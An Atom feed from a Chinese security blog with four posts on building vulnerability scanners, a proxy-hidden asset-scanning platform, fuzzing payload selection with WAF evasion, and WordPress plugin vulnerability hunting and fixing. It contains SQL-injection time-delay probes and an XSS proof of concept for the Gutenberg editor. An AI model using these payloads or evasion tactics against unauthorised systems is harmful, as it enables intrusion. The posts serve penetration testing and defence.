<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-01T01:21:13+08:00</updated><id>http://localhost:4000/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">漏洞POC验证系统实践</title><link href="http://localhost:4000/scanner/2020/08/11/all-info-scan/" rel="alternate" type="text/html" title="漏洞POC验证系统实践" /><published>2020-08-11T20:46:00+08:00</published><updated>2020-08-11T20:46:00+08:00</updated><id>http://localhost:4000/scanner/2020/08/11/all-info-scan</id><content type="html" xml:base="http://localhost:4000/scanner/2020/08/11/all-info-scan/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在渗透过程中，我们针对特定的系统，在通过插件识别类型后，可以利用漏洞脚本进行fuzz。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://gitee.com/hellsec/ppp/raw/master/2020-11-30/1606731837227-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81POC%E7%B3%BB%E7%BB%9F.jpg&quot; alt=&quot;漏洞POC验证系统全景图&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;系统综述&quot;&gt;系统综述&lt;/h3&gt;

&lt;p&gt;在本系统设计之初，是采用的也是分布式平台设计架构，后来因为考虑和分布式资产扫描平台兼容接口，最后为了解耦合，完全改成了单机版。&lt;/p&gt;

&lt;p&gt;首先我们可以看到，在这个地方我们没有单独设计web管理端，只能通过命令行去调度。&lt;/p&gt;

&lt;p&gt;但是，在设计时预留了守护进程rest api，可以接受第三方平台发来的调度请求。&lt;/p&gt;

&lt;p&gt;在插件模块调用方面，主模块有三个：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;流行漏洞插件：主要用于复现常见手工测试用的手段，以及部分团队挖掘的内部漏洞。&lt;/li&gt;
  &lt;li&gt;口令漏洞插件：主要包含端口、中间件、应用的未授权和弱口令漏洞，包含弱口令字典。&lt;/li&gt;
  &lt;li&gt;第三方漏洞插件：主要用于接入网上的部分开源和泄露的插件，用于结果整合和性能调优。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在获取目标信息时，主要有下面几种的形式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;api调度：第三方平台通过rpc传递目标信息，对本系统的api进行调度。&lt;/li&gt;
  &lt;li&gt;命令行调度：通过命令行参数传递目标信息，直接进行调度。&lt;/li&gt;
  &lt;li&gt;资产导入调度：通过接入接口的方式，对于第三方平台api给出的数据进行调度扫描。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本身在分布式资产扫描平台，是存在cms类别和应用类型信息的落库的。但是为了考虑内网的情况，还是单独提取了两个子模块出来：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;cms鉴别插件：主要针对目标进行cms类型的鉴别，如目标匹配到本地的指纹库，会给他打上标签，否则会接入互联网查询接口。&lt;/li&gt;
  &lt;li&gt;应用鉴别插件：主要针对cms类型进行补充，识别服务和应用的类型打上标签，作为第二梯队尝试。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，除了这些模块，还有部分次要的效果优化类插件，这里就不再多提了。&lt;/p&gt;

&lt;p&gt;最后，我们简单讲讲扫描结果落库的问题。&lt;/p&gt;

&lt;p&gt;这里采用的是log打印存储+数据库回传分布式资产扫描平台，而回传的选项是可以关闭的，这就保障了我们在苛刻环境中本系统的兼容性。&lt;/p&gt;

&lt;h3 id=&quot;坑点总结&quot;&gt;坑点总结&lt;/h3&gt;

&lt;p&gt;在对于内网系统，或者存在敏感防火墙的系统进行扫描时，我们可支持接入多类型的代理。&lt;/p&gt;

&lt;h4 id=&quot;速率控制&quot;&gt;速率控制&lt;/h4&gt;

&lt;p&gt;在针对敏感的server进行探测时，第三方插件可能自带的口令认证爆破机制，会比较粗暴。&lt;/p&gt;

&lt;p&gt;要么就是单线程转，要么就是起个粗放的线程池，容易把服务器给跑挂了，或者让人IDS给很快查到。&lt;/p&gt;

&lt;p&gt;所以针对这块儿的控制，我们需要做细致优化，采用动态控制速率的策略，而不光是硬编码配置下发任务。&lt;/p&gt;

&lt;h4 id=&quot;数据统一&quot;&gt;数据统一&lt;/h4&gt;

&lt;p&gt;对于第三方插件，我们花了不少功夫在统一调度机制和库文件上，还有一点比较关键的点，是针对落库的格式上。&lt;/p&gt;

&lt;p&gt;我们在各类插件的上报流程中，对于第三方的插件，会尽量进行数据上报层hook，统一格式后进行上报。&lt;/p&gt;

&lt;p&gt;但并不是每一类插件都有统一落库记录的流程的，对于这类插件可能需要做函数重写。&lt;/p&gt;

&lt;h4 id=&quot;探测尺度&quot;&gt;探测尺度&lt;/h4&gt;

&lt;p&gt;我们的插件目前都是点到为止，为了遵守法律法规层面的制度，都没有进行漏洞深度利用，需要后续人工进行利用和复核。&lt;/p&gt;

&lt;h3 id=&quot;未来企划&quot;&gt;未来企划&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;后渗透利用：目前是没有关于内网利用信息收集的插件的，后面进行后相关poc的开发。&lt;/li&gt;
  &lt;li&gt;云环境利用：对于云环境漏洞目前没有poc，后面会考虑添加。&lt;/li&gt;
  &lt;li&gt;安全设备利用：对于目前流行的对于安全设备的反攻，后面会考虑专门添加插件。&lt;/li&gt;
  &lt;li&gt;WAF、蜜罐探测：对于WAF类和蜜罐环境，以前只是封装了辅助类的函数，后面也会提供专门的插件进行探测。&lt;/li&gt;
&lt;/ul&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在渗透过程中，我们针对特定的系统，在通过插件识别类型后，可以利用漏洞脚本进行fuzz。</summary></entry><entry><title type="html">分布式资产扫描平台实践</title><link href="http://localhost:4000/scanner/2020/07/29/poc-scan/" rel="alternate" type="text/html" title="分布式资产扫描平台实践" /><published>2020-07-29T21:28:00+08:00</published><updated>2020-07-29T21:28:00+08:00</updated><id>http://localhost:4000/scanner/2020/07/29/poc-scan</id><content type="html" xml:base="http://localhost:4000/scanner/2020/07/29/poc-scan/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;以前在乙方干活的时候，对于黑盒扫描的内容研究的比较多也早。此前做了一些内部项目，但没有走涉密。本来还想出来做做开源，不过后来看着不挣钱，加上代码水准有限，也就作罢了。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;时过境迁，相关内容也不太敏感了，项目被人接手以后，应该已经做了不少迭代。&lt;/p&gt;

&lt;p&gt;这里主要想跟大家分享下，原来在建设扫描平台中遇到的思路，文中会拿以前的项目进行脱敏式分析。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://gitee.com/hellsec/ppp/raw/master/2020-11-29/1606648128250-%E5%9F%BA%E7%A1%80%E5%85%A8%E6%99%AF%E5%9B%BE.png&quot; alt=&quot;分布式资产采集平台基础架构&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;平台综述&quot;&gt;平台综述&lt;/h3&gt;

&lt;p&gt;通过图中的内容可以看到，我们的平台是通过两种方式调度的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基于命令行。&lt;/li&gt;
  &lt;li&gt;基于flower（web api）。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们通过在主控服务器，调度celery借助中间件redis，将任务下发到各个agent节点。&lt;/p&gt;

&lt;p&gt;此后，各个节点会根据规则，随机抽取proxy代理池里的ip，以期达到隐匿自身的作用。&lt;/p&gt;

&lt;p&gt;然后，节点会通过对基础模块的复杂调用，向目标发送探测请求包，实现对信息探测结果的落库。&lt;/p&gt;

&lt;p&gt;最后，我们在反馈数据回主控服务器数据库时，会采用加密方式，以免被中间人侦听。&lt;/p&gt;

&lt;p&gt;我们的主要模块有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;信息探测：实现对目标开放的ip或者域名，进行端口、端口banner、服务类型和版本等基础信息探测。&lt;/li&gt;
  &lt;li&gt;cms识别：主要对探测到web类型的目标，进行cms识别。&lt;/li&gt;
  &lt;li&gt;社工引擎：对多个搜索引擎进行爬取，并辅以github之类的第三方接口进行补充。&lt;/li&gt;
  &lt;li&gt;端口服务扫描：调用nmap和masscan接口，并辅以fofa、shodan之类的接口进行补充。&lt;/li&gt;
  &lt;li&gt;路径爆破：对爬取到域名去重探活后，如不存在waf进行暴力扫描，如存在进行智能低频探测。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那么，我们在以上的模块进行交叉调用后，又能得到什么结果呢：&lt;/p&gt;

&lt;p&gt;基础信息：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;目标base结果：包含ip、端口、端口banner、服务类型和版本。&lt;/li&gt;
  &lt;li&gt;cms结果：包含cms类型、版本，如果没有会优先展示webserver。&lt;/li&gt;
  &lt;li&gt;端口扫描结果：分析出真实开放的端口，筛选出其服务类型和版本。&lt;/li&gt;
  &lt;li&gt;路径爆破结果：分析状态码和返回的网页内容，去重找出真实的接口和路径集合。&lt;/li&gt;
  &lt;li&gt;dns资产：ip域名的基础映射集合。&lt;/li&gt;
  &lt;li&gt;email资产：对于某个实体（或者根域名）的所有email资产组合。&lt;/li&gt;
  &lt;li&gt;敏感词资产：对于某个实体（或者根域名）的所有敏感信息组合。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;整合信息（包含基础信息）：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;主机资产：针对单台主机的所有基础信息探测合集。&lt;/li&gt;
  &lt;li&gt;子域名资产：针对特定域名的所有子域名的基础信息合集。&lt;/li&gt;
  &lt;li&gt;子网检测结果：针对特定实体下单IP段的主机资产的基础信息合集。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;对接服务&quot;&gt;对接服务&lt;/h3&gt;

&lt;p&gt;我们讲到了我们获取的资产合集，那么我们可以对接的服务又有哪些呢？&lt;/p&gt;

&lt;p&gt;前面的&lt;a href=&quot;http://blog.hellsec.net/pentest/2017/12/16/architecture-of-apt-pentest/&quot;&gt;《规模渗透架构部署设想》&lt;/a&gt;里，我们提到了一些规划，目前已经研发落地的有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;漏洞POC验证系统：针对采集到的资产数据，针对CMS类型进行验证，如果不能识别会使用通用的脚本进行fuzz。&lt;/li&gt;
  &lt;li&gt;渗透方案查询：类似于私有化的wiki平台，这个在前司曾经维护了一段时间，但后来改成了云笔记协作。&lt;/li&gt;
  &lt;li&gt;漏洞分储系统：当时爬取了seebug等几个国内外知名漏洞库，并单独提取poc，后来由于各大接口经常改动，精力不足暂停维护。&lt;/li&gt;
  &lt;li&gt;被动漏扫系统：这个落地项目在前规划里没有提到，依赖离线web流量会多一些，主要规则涵盖owasp top10，以及主流api漏洞检测，目前暂时没有主动接入本平台api，只会尝试提取生成的数据库结果。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;适用匹配&quot;&gt;适用匹配&lt;/h3&gt;

&lt;p&gt;在当初设计平台时，碰到两个比较重要的问题。&lt;/p&gt;

&lt;h4 id=&quot;兼容性&quot;&gt;&lt;em&gt;兼容性&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;由于本身设计的属于外网资产扫描的平台，在内网渗透时会比较尴尬，很多特性都不太匹配。&lt;/p&gt;

&lt;p&gt;在进行内网渗透时，兼容性都会比单机版要差很多。&lt;/p&gt;

&lt;p&gt;这点在以前跟前大boss讨论时，没少被喷被教育。当然他以价值输出为导向，后来觉得讲的还是很有道理的。&lt;/p&gt;

&lt;p&gt;所以后面再考虑是单开分支，还是单写逻辑在这个项目进行内网模块处理。&lt;/p&gt;

&lt;h4 id=&quot;便携性&quot;&gt;&lt;em&gt;便携性&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;系统本身是分布式的，单机版本也可以，但是启动运行效率不高。&lt;/p&gt;

&lt;p&gt;当初考虑做时候，考虑过打包docker镜像，但是前大boss不太认，觉得在出去搞环境比较复杂，镜像不一定能找机会pull。&lt;/p&gt;

&lt;p&gt;后来，考虑的是一键安装脚本，将容易出问题的库尽量用常规库替代，保证能一键启动关闭，然后任务在丢失后有重试和完整重放机制等等，即在容错兜底上加强了不少。&lt;/p&gt;

&lt;h3 id=&quot;后话&quot;&gt;后话&lt;/h3&gt;

&lt;p&gt;本文大概介绍了对于平台架构、资产收集结果的方案设计要略，后面会单独分析几个对接服务的细节，以及一些新的想法。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">以前在乙方干活的时候，对于黑盒扫描的内容研究的比较多也早。此前做了一些内部项目，但没有走涉密。本来还想出来做做开源，不过后来看着不挣钱，加上代码水准有限，也就作罢了。</summary></entry><entry><title type="html">漏洞扫描：从fuzz到payload</title><link href="http://localhost:4000/scanner/2019/11/19/from-fuzz-to-payload/" rel="alternate" type="text/html" title="漏洞扫描：从fuzz到payload" /><published>2019-11-19T15:53:00+08:00</published><updated>2019-11-19T15:53:00+08:00</updated><id>http://localhost:4000/scanner/2019/11/19/from-fuzz-to-payload</id><content type="html" xml:base="http://localhost:4000/scanner/2019/11/19/from-fuzz-to-payload/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在实现漏洞扫描的时候，部分开发者会使用payload直接进行fuzz，而且并没有对server端的拦截和过滤，有相对智能的反馈，这对扫描效率和成功率是影响比较大的。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;那么，我们该如何去实现精细化定制呢？&lt;/p&gt;

&lt;h3 id=&quot;字符fuzz&quot;&gt;字符fuzz&lt;/h3&gt;

&lt;p&gt;另外，在存在waf的时候，我们发送payload过多，可能直接会触发server端的拒绝服务或者ban ip的操作，所以要在保持一定的发包频率的情况下，尽可能少触发waf的规则。
另外，web系统本身可能自带了过滤，如果无脑发payload，可能fuzz了半天都是白费功夫。
在字符形态的时候，如果能直接过滤掉一批有害或者无效字符，能较大程度上提升扫描器的效率。&lt;/p&gt;

&lt;h3 id=&quot;字符规则过滤&quot;&gt;字符规则过滤&lt;/h3&gt;

&lt;p&gt;在检测时，先通过&lt;strong&gt;字符键值对&lt;/strong&gt;进行探测，如果不通过，则在黑名单库里加上该&lt;strong&gt;字符键值对&lt;/strong&gt;。然后，我们再接着尝试&lt;strong&gt;单边字符&lt;/strong&gt;是否被过滤，过滤了再把&lt;strong&gt;单边字符&lt;/strong&gt;加入黑名单，这样能在一定程度上提升检测效率。&lt;/p&gt;

&lt;p&gt;校验存在键值对的流程：
&lt;img src=&quot;https://s2.ax1x.com/2019/12/26/lEax00.png&quot; alt=&quot;lEax00.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graph LR
字符键值对--&amp;gt;payload流程
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;需要注意的是，我们在进行字符fuzz的时候，别忘了加入定位的keyword，不然在复杂的response响应中，不太容易匹配到。&lt;/p&gt;

&lt;p&gt;键值对举例如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;payload&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(payload)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/*payload*/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;校验不存在键值对的流程：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/26/lEavmq.png&quot; alt=&quot;lEavmq.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graph LR
字符键值对--&amp;gt;单个字符
单个字符--&amp;gt;payload流程
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;单个字符举例如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?
'
&quot;
+
#
;
,
～
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;当然，有人会问是不是每种漏洞类型的检测，都需要按照上述list。&lt;/p&gt;

&lt;p&gt;很明显不是啊，每种漏洞检测需要用到的字符集是不一样的，所以需要根据实际检测的情况，以及所使用的payload库进行分类处理。&lt;/p&gt;

&lt;p&gt;最后，我们可以根据需要，生成&lt;strong&gt;字符（键值对）&lt;/strong&gt; 到黑名单库，从而转到&lt;strong&gt;payload流程&lt;/strong&gt;进行下一步判断。&lt;/p&gt;

&lt;h3 id=&quot;从fuzz到payload&quot;&gt;从fuzz到payload&lt;/h3&gt;

&lt;p&gt;那么我们已经获取到黑名单&lt;strong&gt;字符（键值对）&lt;/strong&gt;以后，该如何去尝试fuzz payload呢？&lt;/p&gt;

&lt;p&gt;每个人习惯不一样，这里可以直接提取黑名单里的内容作为list，接着挨个对payload进行对比尝试，如果满足黑名单条件，则从fuzz列表里去除掉。&lt;/p&gt;

&lt;p&gt;这样一来，能在一定程度上减少fuzz发包数，简易代码示例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# /usr/bin/python2.X
...
...

#init payload list
fuzz_payload = orig_payload

for y in orig_payload:
    for x in char_blacklist:
        #x may be: '(.*?)'
        if re.match(x, y):
            fuzz_payload.remove(x)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;手工简化payload&quot;&gt;手工简化payload&lt;/h3&gt;

&lt;p&gt;拿刷众测举例，我们常常需要在短时间内定位到一个参数是否含有漏洞，配合自动化提交快人一步。&lt;/p&gt;

&lt;p&gt;就sql注入而言，某某曾说过一个参数发两个包就能确认是否含有注入，发四个包就能确定是什么数据库。&lt;/p&gt;

&lt;p&gt;当然可能讲的稍微夸张，但理确实是这个理。&lt;/p&gt;

&lt;p&gt;我们先需要通过fuzz点，来确认单参数是否含有sql注入。这里可以提下，一旦结束单参数fuzz，我们可以直接结束掉该url所有参数的fuzz。&lt;/p&gt;

&lt;p&gt;另外，不少厂商是是接受多点同类漏洞的，这意思是拿到某个或者某类参数，我们可以去尝试自动化类比fuzz其他地方，是否也存在相似问题。&lt;/p&gt;

&lt;p&gt;过滤掉前面的的黑名单字符集，把poc打散然后闭合和注释，再通过判断content-length差距、页面hash变化、时间延时变化，分两步检测快速fuzz出初步结果。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;or 8 &amp;lt; 9
or 0 between 8 and 9
and 8 &amp;gt; 9
xor 8 &amp;gt; 9
xor 0 between 8 and 9
or sleep(8)
and sleep(8)
xor sleep(8)
;select sleep(8)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;接着，我们可以通过主流数据库的&lt;strong&gt;单个甄别性&lt;/strong&gt;查询语句（比如mssql/oracle/mysql/…），分独立的包发送进行探测，这样能很快的作出判断。&lt;/p&gt;

&lt;p&gt;可能有人会说，这样可能会漏掉部分特殊的点。&lt;/p&gt;

&lt;p&gt;拜托，众测的时候就是比手快的，你说一个url所有参数都跑一遍的话，就拿sqlmap举例，如果某个点稍微有点特殊，可能几分钟都过去了，才能判断那个点是不是有注入。&lt;/p&gt;

&lt;p&gt;如果你在半小时后找到个注入，人家已经在十来分钟的时候提交了，不把人气的吐血三升？&lt;/p&gt;

&lt;p&gt;而且，并不是说我们就不关注细节。只不过是做深入fuzz的优先级是相对的，我们需要优先关注cover的广度，而不是cover的深度。&lt;/p&gt;

&lt;p&gt;最后，我们可以最快速度得出结果后，再后续使用专用fuzz工具进行二段攻击。&lt;/p&gt;

&lt;h3 id=&quot;分级fuzz&quot;&gt;分级fuzz&lt;/h3&gt;

&lt;p&gt;另外，在发送payload之前，我们能够检测到系统框架的类型，是一个比较有利的起手，这代表我们可以不用盲目尝试payload。&lt;/p&gt;

&lt;p&gt;在使用网上的payload的同时，我们也需要去尽可能的去分级和简化。大家要相信，这玩意儿是给自己或者团队用的，不是用来忽悠客户的。&lt;/p&gt;

&lt;p&gt;搞一堆华丽丽的东西，最后自己吃没吃饱，只有自家的肚子知道。&lt;/p&gt;

&lt;p&gt;分级和简化payload后的结果就是，比如在使用传统扫描器（含接口）如sqlmap和awvs的时候，大家可能永远会觉得机器会帮你扫出来，永远有惰性不会去精简poc，别人一键化拿shell的时候，你可能才刚刚确认cms框架类型。&lt;/p&gt;

&lt;p&gt;最终，我们根据测试的场景，可以将手中的扫描器按测试需求，分级别去发送payload：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;level1: 最简单可以获取基础反馈的poc。&lt;/li&gt;
  &lt;li&gt;level2: 直接可以获取数据和证明危害的payload。&lt;/li&gt;
  &lt;li&gt;level3: 直接可以获取shell，或者证明rce/上传漏洞存在的txt文件。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，如果这里调的level比较高的话，低级别的poc检测成功后，是可以向上跃迁检测的。&lt;/p&gt;

&lt;p&gt;另外，这里不建议优先采用公共dns平台，因为即使是使用了api交互，公共dns平台也一般会有延时的风险，更别提可能被GA监控管制，再者说证明截图啥的，也需要时间的。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在实现漏洞扫描的时候，部分开发者会使用payload直接进行fuzz，而且并没有对server端的拦截和过滤，有相对智能的反馈，这对扫描效率和成功率是影响比较大的。</summary></entry><entry><title type="html">Wordpress插件漏洞的攻防浅析</title><link href="http://localhost:4000/vuln/2019/10/23/wordpress-adsec/" rel="alternate" type="text/html" title="Wordpress插件漏洞的攻防浅析" /><published>2019-10-23T23:40:00+08:00</published><updated>2019-10-23T23:40:00+08:00</updated><id>http://localhost:4000/vuln/2019/10/23/wordpress-adsec</id><content type="html" xml:base="http://localhost:4000/vuln/2019/10/23/wordpress-adsec/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;常用输入点&quot;&gt;常用输入点&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;$_GET&lt;/li&gt;
  &lt;li&gt;$_POST&lt;/li&gt;
  &lt;li&gt;$_REQUEST&lt;/li&gt;
  &lt;li&gt;$_SERVER[‘REQUEST_URI’]&lt;/li&gt;
  &lt;li&gt;$_SERVER[‘PHP_SELF’]&lt;/li&gt;
  &lt;li&gt;$_SERVER[‘HTTP_REFERER’]&lt;/li&gt;
  &lt;li&gt;$_COOKIE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果要挖掘指定的cms漏洞，我们就需要去寻找代码里，一些比较重要的自带函数是否存在漏洞。或者也可以看看一些安全过滤函数，是否得到了正确应用。&lt;/p&gt;

&lt;h3 id=&quot;输入检查&quot;&gt;输入检查&lt;/h3&gt;

&lt;p&gt;例如， 开发者可以使用sanitize_email()来清理电子邮件的地址，使用sanitize_text_field()来清理文本，使用sanitize_sql_orderby()来验证SQL的ORDER BY语句等。 WordPress中的sanitize_*()类辅助函数已经覆盖了大多数用户输入类型：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;sanitize_email()&lt;/li&gt;
  &lt;li&gt;sanitize_file_name()&lt;/li&gt;
  &lt;li&gt;sanitize_hex_color()&lt;/li&gt;
  &lt;li&gt;sanitize_hex_color_no_hash()&lt;/li&gt;
  &lt;li&gt;sanitize_html_class()&lt;/li&gt;
  &lt;li&gt;sanitize_key()&lt;/li&gt;
  &lt;li&gt;sanitize_meta()&lt;/li&gt;
  &lt;li&gt;sanitize_mime_type()&lt;/li&gt;
  &lt;li&gt;sanitize_option()&lt;/li&gt;
  &lt;li&gt;sanitize_sql_orderby()&lt;/li&gt;
  &lt;li&gt;sanitize_text_field()&lt;/li&gt;
  &lt;li&gt;sanitize_title()&lt;/li&gt;
  &lt;li&gt;sanitize_title_for_query()&lt;/li&gt;
  &lt;li&gt;sanitize_title_with_dashes()&lt;/li&gt;
  &lt;li&gt;sanitize_user()&lt;/li&gt;
  &lt;li&gt;esc_url_raw()&lt;/li&gt;
  &lt;li&gt;wp_filter_post_kses()&lt;/li&gt;
  &lt;li&gt;wp_filter_nohtml_kses()&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;输出检查&quot;&gt;输出检查&lt;/h3&gt;

&lt;p&gt;如果没有做好输出检查，可能会导致各种模板注入或者xss一类的漏洞。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;esc_html() 更改html响应类型&lt;/li&gt;
  &lt;li&gt;esc_url() 过滤url里的内容。&lt;/li&gt;
  &lt;li&gt;esc_js()  过滤内联js内容的输出内容。&lt;/li&gt;
  &lt;li&gt;esc_attr() 用于过滤输出点在标签属性中的情况，相应的转义。&lt;/li&gt;
  &lt;li&gt;esc_textarea() 用于过滤输出点在textarea标签中的情况，相应的转义。&lt;/li&gt;
  &lt;li&gt;tag_escape() 用于出现在HTML标签中的情况，主要用于正则。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;xss&quot;&gt;xss&lt;/h3&gt;

&lt;p&gt;举例：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;add_query_arg()&lt;/li&gt;
  &lt;li&gt;remove_query_arg()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上面两个是wordpress用来动态添加/删除参数的，要是保持默认不指定字符串作为参数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo add_query_arg( array(
    'key1' =&amp;gt; 'value1',
    'key2' =&amp;gt; 'value2',
), 'http://example.com' );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;他会使用未经过转义的$_SERVER[‘REQUEST_URI’]，而不是$_SERVER[‘PHP_SELF’]，这样直接打印出来可能会造成xss漏洞。&lt;/p&gt;

&lt;p&gt;防范的话：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;在重定向或者header里面建议使用esc_url_raw。&lt;/li&gt;
  &lt;li&gt;打印完整url时，需要使用esc_url来转为HTML实体。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果完全不考虑在文章里加入未过滤的html标签，有个函数是对wordpress超级管理员也生效的
如果要屏蔽所有的用户，包括管理员，超级管理员，我们可以这样设置：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define( 'DISALLOW_UNFILTERED_HTML', true );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;输出渲染导致的html实体编码失效&quot;&gt;输出渲染导致的HTML实体编码失效&lt;/h4&gt;

&lt;p&gt;比如，在WordPress内置的编辑器Gutenberg中（WordPress 5.0到5.2.2相关联），FortiGuard Labs的威胁研究人员Zhouyuan Yang表示，如果文章中包含一条“Shortcode”的错误信息，则Gutenberg无法过滤文章的javascript/HTML代码。&lt;/p&gt;

&lt;p&gt;Shortcode本质上是WordPress用户用来嵌入文件或创建对象的快捷方式，这些对象和文件通常涉及复杂的代码，而Shortcode数据块可以通过单击Gutenberg编辑器中的“Add Block”按钮添加到页面中。&lt;/p&gt;

&lt;p&gt;然而，根据分析，当将某些被编码的HTML字符(如\&amp;lt;)添加到Shortcode数据块中时，就会发生某些错误。&lt;/p&gt;

&lt;p&gt;在Wordpress预览文章时会把\&amp;lt;解码为&amp;lt;，此时XSS过滤器毫无反应。相关PoC：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;gt;&amp;amp;lt;img src=1 on error=prompt(1)&amp;amp;gt;。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

